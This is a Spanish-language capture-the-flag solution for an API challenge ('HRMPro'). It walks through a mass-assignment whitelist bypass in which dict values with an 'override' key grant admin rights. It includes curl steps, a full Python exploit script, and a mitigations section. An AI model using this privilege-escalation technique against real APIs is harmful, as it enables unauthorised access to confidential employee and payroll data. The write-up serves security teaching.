# Solución — api-hrmpro · HRMPro Human Resources API

**Categoría:** API  
**Dificultad:** INSANE  
**Puntos:** 500  
**Vulnerabilidad:** Mass Assignment con bypass de type-check (whitelist eludida por tipo `dict`)

---

## Resumen de la vulnerabilidad

El endpoint `PUT /profile/update` protege campos privilegiados mediante una lista blanca:

```python
ALLOWED_FIELDS = {'email', 'department', 'phone'}
```

Sin embargo, la comprobación de whitelist **solo aplica a valores de tipo `str`**. Si el valor es
un `dict`, la comprobación se salta por completo. El servidor tiene lógica adicional que procesa
dicts como "patch operators", extrayendo el valor real de la clave `'override'`:

```python
for key, val in data.items():
    if isinstance(val, str):          # solo strings entran al filtro
        if key not in ALLOWED_FIELDS:
            rejected.append(key)
            continue
        updates[key] = val
    elif isinstance(val, dict):       # dicts evaden la whitelist
        resolved_val = val.get('override', val)
        updates[key] = resolved_val   # se asigna directamente al campo
```

Enviando `{"is_admin": {"override": true}, "salary_grade": {"override": "EXECUTIVE"}}` se
eluden ambas protecciones y se escalan privilegios hasta obtener la flag en `/admin/flag`.

---

## Reconocimiento inicial

```bash
# Explorar la API
curl http://<host>:5005/
```

Respuesta:
```json
{
  "api": "HRMPro Human Resources API",
  "version": "5.1.2",
  "endpoints": {
    "register": "POST /auth/register",
    "login": "POST /auth/login",
    "profile": "GET /profile",
    "update_profile": "PUT /profile/update",
    "employees": "GET /admin/employees",
    "payroll": "GET /admin/payroll"
  },
  "note": "Enterprise HR management platform. Self-service profile updates available."
}
```

---

## Pasos de explotación

### Paso 1 — Crear una cuenta de usuario

```bash
curl -s -X POST http://<host>:5005/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "P@ssw0rd!", "email": "hacker@evil.com"}' | jq .
```

Guardar el `access_token` de la respuesta:
```json
{
  "message": "registered",
  "access_token": "<JWT>",
  "user_id": 2
}
```

```bash
TOKEN="<JWT obtenido>"
```

### Paso 2 — Intentar acceder a la flag directamente (403)

```bash
curl -s http://<host>:5005/admin/flag \
  -H "Authorization: Bearer $TOKEN" | jq .
```

Respuesta:
```json
{
  "error": "forbidden",
  "message": "Admin access required"
}
```

Se necesita `is_admin=1` **y** `salary_grade='EXECUTIVE'`.

### Paso 3 — Ver campos editables (whitelist pública)

```bash
curl -s http://<host>:5005/ | jq '.endpoints.update_profile'
# "PUT /profile/update"
```

Los campos editables documentados son `email`, `department`, `phone`. El reto invita
a creer que los campos privilegiados están bloqueados.

### Paso 4 — Intentar mass assignment directo (bloqueado para strings)

```bash
curl -s -X PUT http://<host>:5005/profile/update \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_admin": "true", "salary_grade": "EXECUTIVE"}' | jq .
```

Respuesta: los campos se rechazan porque son strings y no están en la whitelist:
```json
{
  "error": "no valid fields to update",
  "rejected": ["is_admin", "salary_grade"]
}
```

### Paso 5 — Bypass por tipo dict con clave 'override' (EXPLOTACIÓN)

La whitelist solo filtra `str`. Un `dict` salta directamente al bloque de "patch operators"
donde el servidor extrae el valor de la clave `'override'` y lo asigna al campo sin validar.

```bash
curl -s -X PUT http://<host>:5005/profile/update \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacker@evil.com",
    "is_admin": {"override": true},
    "salary_grade": {"override": "EXECUTIVE"}
  }' | jq .
```

Respuesta exitosa:
```json
{
  "message": "profile updated",
  "updated_fields": ["email", "is_admin", "salary_grade"],
  "rejected_fields": [],
  "profile": {
    "email": "hacker@evil.com",
    "department": "General",
    "phone": ""
  }
}
```

Los campos `is_admin` y `salary_grade` se actualizaron sin rechazo.

### Paso 6 — Obtener la flag

```bash
curl -s http://<host>:5005/admin/flag \
  -H "Authorization: Bearer $TOKEN" | jq .
```

Respuesta:
```json
{
  "classification": "EXECUTIVE CONFIDENTIAL",
  "flag": "HL4{...flag_real...}",
  "payroll_data": {
    "base_salary": "$250,000",
    "bonus": "$75,000",
    "equity_grant": "50,000 RSUs"
  }
}
```

---

## Exploit completo en Python

```python
#!/usr/bin/env python3
"""Exploit — api-hrmpro: mass assignment + dict type-check bypass."""
import sys
import requests

HOST = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5005"
s = requests.Session()

# 1. Registrar usuario
print("[*] Registrando usuario...")
r = s.post(f"{HOST}/auth/register", json={
    "username": "pwner",
    "password": "P@ssw0rd!",
    "email": "pwner@evil.com",
})
r.raise_for_status()
token = r.json()["access_token"]
print(f"    Token JWT obtenido: {token[:40]}...")

hdrs = {"Authorization": f"Bearer {token}"}

# 2. Comprobar que no tenemos acceso a la flag
print("[*] Verificando acceso inicial a /admin/flag...")
r = s.get(f"{HOST}/admin/flag", headers=hdrs)
assert r.status_code == 403, "Esperaba 403"
print(f"    403 confirmado: {r.json()['message']}")

# 3. Intentar mass assignment con string (debe rechazarse)
print("[*] Probando mass assignment con string (debe fallar)...")
r = s.put(f"{HOST}/profile/update", headers=hdrs, json={
    "is_admin": "true",
    "salary_grade": "EXECUTIVE",
})
data = r.json()
assert "is_admin" in data.get("rejected", []), "Esperaba rechazo de is_admin"
print(f"    Rechazado correctamente: {data['rejected']}")

# 4. Bypass con dict + clave 'override'
print("[*] Ejecutando bypass: dict con clave 'override'...")
r = s.put(f"{HOST}/profile/update", headers=hdrs, json={
    "email": "pwner@evil.com",
    "is_admin": {"override": True},
    "salary_grade": {"override": "EXECUTIVE"},
})
r.raise_for_status()
data = r.json()
assert "is_admin" in data["updated_fields"], "is_admin no fue actualizado"
assert "salary_grade" in data["updated_fields"], "salary_grade no fue actualizado"
print(f"    Campos actualizados: {data['updated_fields']}")

# 5. Obtener la flag
print("[*] Obteniendo flag...")
r = s.get(f"{HOST}/admin/flag", headers=hdrs)
r.raise_for_status()
flag = r.json()["flag"]
print(f"\n    FLAG: {flag}")
```

Uso:
```bash
python3 exploit.py http://<host>:5005
```

---

## Por qué es INSANE

1. **La whitelist parece completa:** Al leer la API, la lista blanca de campos (`email`,
   `department`, `phone`) parece funcionar correctamente. Un rechazo explícito al enviar
   `{"is_admin": "true"}` refuerza esa percepción.

2. **El bypass no es intuitivo:** Requiere entender que la condición `isinstance(val, str)`
   solo filtra strings. Tipos alternativos (dict, int, bool) entran por otras ramas del
   código sin pasar por la whitelist.

3. **La clave `'override'` hay que descubrirla en el código fuente:** No hay documentación
   externa de este comportamiento. El jugador debe analizar la lógica del servidor para
   identificar que los dicts se procesan como "patch operators".

4. **Doble condición en la flag:** La flag requiere `is_admin=True` **y**
   `salary_grade='EXECUTIVE'`. Un intento parcial (solo uno de los dos) genera un error
   diferente, lo que puede llevar a creer que se está explotando incorrectamente.

---

## Mitigaciones

1. **Validar tipos explícitamente:** La whitelist debe aplicarse al nombre del campo
   independientemente del tipo del valor:
   ```python
   if key not in ALLOWED_FIELDS:
       rejected.append(key)
       continue
   ```

2. **Usar mapeo explícito de campos:** Construir el objeto de actualización solo con campos
   conocidos y seguros, nunca iterar sobre claves enviadas por el cliente:
   ```python
   UPDATABLE = {'email', 'department', 'phone'}
   updates = {k: v for k, v in data.items() if k in UPDATABLE and isinstance(v, str)}
   ```

3. **Nunca usar claves del usuario como nombres de columna SQL:** Aunque este servidor
   tiene una lista `valid_columns`, el patrón de construir `SET {field}=?` con datos
   del usuario es inherentemente arriesgado.

4. **Separar DTOs de modelos de base de datos:** Usar clases de validación (Pydantic,
   marshmallow) que solo expongan los campos editables, en lugar de pasar el JSON del
   cliente directamente al modelo.
